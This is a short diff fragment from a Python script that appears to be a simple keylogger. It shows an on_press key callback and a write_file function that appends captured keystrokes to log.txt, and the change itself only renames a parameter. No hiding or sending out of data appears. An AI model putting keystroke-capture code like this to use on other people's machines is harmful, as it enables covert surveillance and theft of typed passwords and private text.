@@ -15,9 +15,9 @@ def on_press(key):
         write_file(keys)
         keys = []
 
-def write_file(keys):
+def write_file(keys_list):
     with open ("log.txt", "a") as f:
-        for key in keys:
+        for key in keys_list:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
                 f.write("-")
